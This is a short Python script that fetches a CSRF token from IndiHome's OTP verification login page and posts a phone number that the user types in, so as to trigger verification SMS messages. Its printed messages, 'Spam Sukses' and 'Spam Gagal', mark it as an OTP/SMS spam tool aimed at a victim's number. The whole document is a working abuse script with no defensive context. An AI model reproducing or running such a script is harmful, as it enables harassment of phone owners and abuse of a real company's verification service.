import requests
import re


s = requests.Session()

no = input("NO: ")

url = "https://www.indihome.co.id/verifikasi-layanan/login-verifikasi-otp"

token = s.post(url).text
token = re.findall(r"name=\"_token\" value=\"(.*?)\"", token)[0]

data = {
"_token":token,
"msisdn":no,
}

respon = s.post(url, data=data).text

if "Gagal!" in (respon):
     print ("Spam Gagal")
else:
     print ("Spam Sukses")
